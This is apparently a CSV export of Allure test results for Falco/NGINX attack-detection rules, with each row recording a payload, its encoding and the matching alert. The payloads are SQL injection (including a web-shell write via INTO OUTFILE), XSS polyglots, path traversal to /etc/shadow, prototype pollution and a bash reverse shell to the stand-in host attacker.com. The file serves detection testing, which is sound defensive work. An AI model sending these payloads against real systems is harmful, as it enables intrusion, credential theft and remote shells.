"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_TIME_008` |
| **Name** | URL encoded WAITFOR DELAY |
| **Category** | SQLI |
| **Subcategory** | time_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `WAITFOR%20DELAY%20%270%3A0%3A5%27`
- **Encoded**: `WAITFOR%2520DELAY%2520%25270%253A0%253A5%2527`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~72000ms
- **Timestamp**: 03:40:15.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Time-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_008-1769917215553-b0i1du pattern_id=SQLI_TIME_008 uri=/?q=WAITFOR%2520DELAY%2520%25270%253A0%253A5%2527 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_008-1769917215553-b0i1du pattern_id=SQLI_TIME_008 uri=/?q=WAITFOR%2520DELAY%2520%25270%253A0%253A5%2527 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
03:40:15.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_008-1769917215553-b0i1du pattern_id=SQLI_TIME_008 uri=/?q=WAITFOR%2520DELAY%2520%25270%253A0%253A5%2527 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[103_SQLI_TIME_008]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BYPASS_008` |
| **Name** | MySQL comment bypass variation |
| **Category** | SQLI |
| **Subcategory** | bypass_waf |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' /*!UNION*/ /*!SELECT*/ version(),NULL,NULL--`
- **Encoded**: `'%20%2F*!UNION*%2F%20%2F*!SELECT*%2F%20version()%2CNULL%2CNULL--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~45000ms
- **Timestamp**: 03:40:42.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BYPASS_008-1769917242609-wpetz pattern_id=SQLI_BYPASS_008 uri=/?q='%20%2F*!UNION*%2F%20%2F*!SELECT*%2F%20version()%2CNULL%2CNULL-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BYPASS_008-1769917242609-wpetz pattern_id=SQLI_BYPASS_008 uri=/?q='%20%2F*!UNION*%2F%20%2F*!SELECT*%2F%20version()%2CNULL%2CNULL-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
03:40:42.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BYPASS_008-1769917242609-wpetz pattern_id=SQLI_BYPASS_008 uri=/?q='%20%2F*!UNION*%2F%20%2F*!SELECT*%2F%20version()%2CNULL%2CNULL-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[057_SQLI_BYPASS_008]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BOOL_001` |
| **Name** | Classic boolean injection |
| **Category** | SQLI |
| **Subcategory** | boolean_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' OR '1'='1`
- **Encoded**: `%27%20OR%20%271%27%3D%271`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~68000ms
- **Timestamp**: 03:40:19.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_001-1769917219563-uhrgwj pattern_id=SQLI_BOOL_001 uri=/?q=%27%20OR%20%271%27%3D%271 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_001-1769917219563-uhrgwj pattern_id=SQLI_BOOL_001 uri=/?q=%27%20OR%20%271%27%3D%271 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
03:40:19.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_001-1769917219563-uhrgwj pattern_id=SQLI_BOOL_001 uri=/?q=%27%20OR%20%271%27%3D%271 client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[032_SQLI_BOOL_001]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PP_NESTED_002` |
| **Name** | Deep Nested __proto__ |
| **Category** | PROTOTYPE_POLLUTION |
| **Subcategory** | nested |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `?obj[__proto__][__proto__][polluted]=true`
- **Encoded**: `%3Fobj%5B__proto__%5D%5B__proto__%5D%5Bpolluted%5D%3Dtrue`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~7000ms
- **Timestamp**: 03:41:20.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX PP] Prototype pollution attack attempt` |
| **Matched Rule** | `[NGINX PP] Prototype pollution attack attempt test_id=PP_NESTED_002-1769917280050-ghlo pattern_id=PP_NESTED_002 uri=/?q=%3Fobj%5B__proto__%5D%5B__proto__%5D%5Bpolluted%5D%3Dtrue client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX PP] Prototype pollution attack attempt test_id=PP_NESTED_002-1769917280050-ghlo pattern_id=PP_NESTED_002 uri=/?q=%3Fobj%5B__proto__%5D%5B__proto__%5D%5Bpolluted%5D%3Dtrue client=127.0.0.1

**Falco Log Entry**:
```
03:41:20.000000000: Warning [NGINX PP] Prototype pollution attack attempt test_id=PP_NESTED_002-1769917280050-ghlo pattern_id=PP_NESTED_002 uri=/?q=%3Fobj%5B__proto__%5D%5B__proto__%5D%5Bpolluted%5D%3Dtrue client=127.0.0.1
```","2","test_e2e_with_logs[439_PP_NESTED_002]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_DOT_002` |
| **Name** | Shadow file access via path traversal |
| **Category** | PATH |
| **Subcategory** | dot_dot_slash |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `../../etc/shadow`
- **Encoded**: `../../etc/shadow`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~62000ms
- **Timestamp**: 03:40:25.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_002-1769917225052-hbjcmb pattern_id=PATH_DOT_002 uri=/?q=../../etc/shadow client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_002-1769917225052-hbjcmb pattern_id=PATH_DOT_002 uri=/?q=../../etc/shadow client=127.0.0.1

**Falco Log Entry**:
```
03:40:25.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_002-1769917225052-hbjcmb pattern_id=PATH_DOT_002 uri=/?q=../../etc/shadow client=127.0.0.1
```","2","test_e2e_with_logs[240_PATH_DOT_002]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASH_002` |
| **Name** | Bash reverse shell |
| **Category** | CMDI |
| **Subcategory** | bash_specific |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `&& bash -i >& /dev/tcp/attacker.com/4444 0>&1`
- **Encoded**: `%26%26%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fattacker.com%2F4444%200%3E%261`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~25000ms
- **Timestamp**: 03:41:02.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_BASH_002-1769917262627-7z1m1 pattern_id=CMD_BASH_002 uri=/?q=%26%26%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fattacker.com%2F4444%200%3E%261 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASH_002-1769917262627-7z1m1 pattern_id=CMD_BASH_002 uri=/?q=%26%26%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fattacker.com%2F4444%200%3E%261 client=127.0.0.1

**Falco Log Entry**:
```
03:41:02.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASH_002-1769917262627-7z1m1 pattern_id=CMD_BASH_002 uri=/?q=%26%26%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fattacker.com%2F4444%200%3E%261 client=127.0.0.1
```","2","test_e2e_with_logs[297_CMD_BASH_002]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_REFL_004` |
| **Name** | Iframe javascript scheme XSS |
| **Category** | XSS |
| **Subcategory** | reflected_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<iframe src=javascript:alert('XSS')>`
- **Encoded**: `%3Ciframe%20src%3Djavascript%3Aalert%28%27XSS%27%29%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~69000ms
- **Timestamp**: 03:40:18.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_004-1769917218546-wi6b0no pattern_id=XSS_REFL_004 uri=/?q=%3Ciframe%20src%3Djavascript%3Aalert%28%27XSS%27%29%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_004-1769917218546-wi6b0no pattern_id=XSS_REFL_004 uri=/?q=%3Ciframe%20src%3Djavascript%3Aalert%28%27XSS%27%29%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
03:40:18.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_004-1769917218546-wi6b0no pattern_id=XSS_REFL_004 uri=/?q=%3Ciframe%20src%3Djavascript%3Aalert%28%27XSS%27%29%3E client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[189_XSS_REFL_004]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_STACK_007` |
| **Name** | Web shell creation |
| **Category** | SQLI |
| **Subcategory** | stacked_query |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `'; SELECT INTO OUTFILE '/var/www/html/shell.php' 'PHP_SHELL_CODE'; --`
- **Encoded**: `%27%3B%20SELECT%20INTO%20OUTFILE%20%27%2Fvar%2Fwww%2Fhtml%2Fshell.php%27%20%27PHP_SHELL_CODE%27%3B%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~21000ms
- **Timestamp**: 03:41:06.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt` |
| **Matched Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_STACK_007-1769917266160-yyzor pattern_id=SQLI_STACK_007 uri=/?q=%27%3B%20SELECT%20INTO%20OUTFILE%20%27%2Fvar%2Fwww%2Fhtml%2Fshell.php%27%20%27PHP_SHELL_CODE%27%3B%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_STACK_007-1769917266160-yyzor pattern_id=SQLI_STACK_007 uri=/?q=%27%3B%20SELECT%20INTO%20OUTFILE%20%27%2Fvar%2Fwww%2Fhtml%2Fshell.php%27%20%27PHP_SHELL_CODE%27%3B%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
03:41:06.000000000: Warning [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_STACK_007-1769917266160-yyzor pattern_id=SQLI_STACK_007 uri=/?q=%27%3B%20SELECT%20INTO%20OUTFILE%20%27%2Fvar%2Fwww%2Fhtml%2Fshell.php%27%20%27PHP_SHELL_CODE%27%3B%20-- client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[095_SQLI_STACK_007]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_PIPE_004` |
| **Name** | Directory listing piped to head |
| **Category** | CMDI |
| **Subcategory** | pipe |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `ls -la | head -10`
- **Encoded**: `ls%20-la%20%7C%20head%20-10`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~22000ms
- **Timestamp**: 03:41:05.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command injection via pipe` |
| **Matched Rule** | `[NGINX CMDi] Command injection via pipe test_id=CMD_PIPE_004-1769917265633-jm1kt0q pattern_id=CMD_PIPE_004 uri=/?q=ls%20-la%20%7C%20head%20-10 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via pipe test_id=CMD_PIPE_004-1769917265633-jm1kt0q pattern_id=CMD_PIPE_004 uri=/?q=ls%20-la%20%7C%20head%20-10 client=127.0.0.1

**Falco Log Entry**:
```
03:41:05.000000000: Critical [NGINX CMDi] Command injection via pipe test_id=CMD_PIPE_004-1769917265633-jm1kt0q pattern_id=CMD_PIPE_004 uri=/?q=ls%20-la%20%7C%20head%20-10 client=127.0.0.1
```","2","test_e2e_with_logs[354_CMD_PIPE_004]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_ADV_087` |
| **Name** | UPDATE SET Injection |
| **Category** | SQLI |
| **Subcategory** | advanced |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `UPDATE users SET role='admin'`
- **Encoded**: `UPDATE%20users%20SET%20role%3D%27admin%27`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~32000ms
- **Timestamp**: 03:40:55.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt` |
| **Matched Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_ADV_087-1769917255136-ggb67d pattern_id=SQLI_ADV_087 uri=/?q=UPDATE%20users%20SET%20role%3D%27admin%27 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_ADV_087-1769917255136-ggb67d pattern_id=SQLI_ADV_087 uri=/?q=UPDATE%20users%20SET%20role%3D%27admin%27 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
03:40:55.000000000: Warning [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_ADV_087-1769917255136-ggb67d pattern_id=SQLI_ADV_087 uri=/?q=UPDATE%20users%20SET%20role%3D%27admin%27 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[013_SQLI_ADV_087]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_ENC_002` |
| **Name** | URL encoded AND operator with ls |
| **Category** | CMDINJ |
| **Subcategory** | encoded_commands |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `%26%26%20ls%20-la`
- **Encoded**: `%2526%2526%2520ls%2520-la`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~43000ms
- **Timestamp**: 03:40:44.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern` |
| **Matched Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_ENC_002-1769917244582-jxdhxk pattern_id=CMD_ENC_002 uri=/?q=%2526%2526%2520ls%2520-la client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_ENC_002-1769917244582-jxdhxk pattern_id=CMD_ENC_002 uri=/?q=%2526%2526%2520ls%2520-la client=127.0.0.1 method=GET

**Falco Log Entry**:
```
03:40:44.000000000: Warning [NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_ENC_002-1769917244582-jxdhxk pattern_id=CMD_ENC_002 uri=/?q=%2526%2526%2520ls%2520-la client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[327_CMD_ENC_002]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_POLY_001` |
| **Name** | Universal XSS polyglot |
| **Category** | XSS |
| **Subcategory** | polyglot_xss |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert('XSS');//'>`
- **Encoded**: `javascript%3A%2F*--%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3C%2Fscript%3E%3C%2Fxmp%3E%3Csvg%2Fonload%3D'%2B%2F%22%2F%2B%2Fonmouseover%3D1%2F%2B%2F%5B*%2F%5B%5D%2F%2Balert('XSS')%3B%2F%2F'%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~59000ms
- **Timestamp**: 03:40:28.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_POLY_001-1769917228571-07xhn pattern_id=XSS_POLY_001 uri=/?q=javascript%3A%2F*--%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3C%2Fscript%3E%3C%2Fxmp%3E%3Csvg%2Fonload%3D'%2B%2F%22%2F%2B%2Fonmouseover%3D1%2F%2B%2F%5B*%2F%5B%5D%2F%2Balert('XSS')%3B%2F%2F'%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_POLY_001-1769917228571-07xhn pattern_id=XSS_POLY_001 uri=/?q=javascript%3A%2F*--%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3C%2Fscript%3E%3C%2Fxmp%3E%3Csvg%2Fonload%3D'%2B%2F%22%2F%2B%2Fonmouseover%3D1%2F%2B%2F%5B*%2F%5B%5D%2F%2Balert('XSS')%3B%2F%2F'%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
03:40:28.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_POLY_001-1769917228571-07xhn pattern_id=XSS_POLY_001 uri=/?q=javascript%3A%2F*--%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3C%2Fscript%3E%3C%2Fxmp%3E%3Csvg%2Fonload%3D'%2B%2F%22%2F%2B%2Fonmouseover%3D1%2F%2B%2F%5B*%2F%5B%5D%2F%2Balert('XSS')%3B%2F%2F'%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[176_XSS_POLY_001]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `API_MASS_001` |
| **Name** | Mass Assignment - Role Escalation |
| **Category** | API_SECURITY |
| **Subcategory** | mass_assignment |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `{""username"":""user"",""role"":""admin"",""isAdmin"":true}`
- **Encoded**: `%7B%22username%22%3A%22user%22%2C%22role%22%3A%22admin%22%2C%22isAdmin%22%3Atrue%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~19000ms
- **Timestamp**: 03:41:08.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX API Attack] API security vulnerability detected` |
| **Matched Rule** | `[NGINX API Attack] API security vulnerability detected test_id=API_MASS_001-1769917268046-pl5cm pattern_id=API_MASS_001 uri=/?q=%7B%22username%22%3A%22user%22%2C%22role%22%3A%22admin%22%2C%22isAdmin%22%3Atrue%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX API Attack] API security vulnerability detected test_id=API_MASS_001-1769917268046-pl5cm pattern_id=API_MASS_001 uri=/?q=%7B%22username%22%3A%22user%22%2C%22role%22%3A%22admin%22%2C%22isAdmin%22%3Atrue%7D client=127.0.0.1

**Falco Log Entry**:
```
03:41:08.000000000: Warning [NGINX API Attack] API security vulnerability detected test_id=API_MASS_001-1769917268046-pl5cm pattern_id=API_MASS_001 uri=/?q=%7B%22username%22%3A%22user%22%2C%22role%22%3A%22admin%22%2C%22isAdmin%22%3Atrue%7D client=127.0.0.1
```","2","test_e2e_with_logs[428_API_MASS_001]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_BASIC_002` |
| **Name** | Double parent directory traversal |
| **Category** | PATH |
| **Subcategory** | basic_traversal |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `../../`
- **Encoded**: `../../`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~65000ms
- **Timestamp**: 03:40:22.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_BASIC_002-1769917222545-6ai8nr pattern_id=PATH_BASIC_002 uri=/?q=../../ client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_BASIC_002-1769917222545-6ai8nr pattern_id=PATH_BASIC_002 uri=/?q=../../ client=127.0.0.1

**Falco Log Entry**:
```
03:40:22.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_BASIC_002-1769917222545-6ai8nr pattern_id=PATH_BASIC_002 uri=/?q=../../ client=127.0.0.1
```","1","test_e2e_with_logs[230_PATH_BASIC_002]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
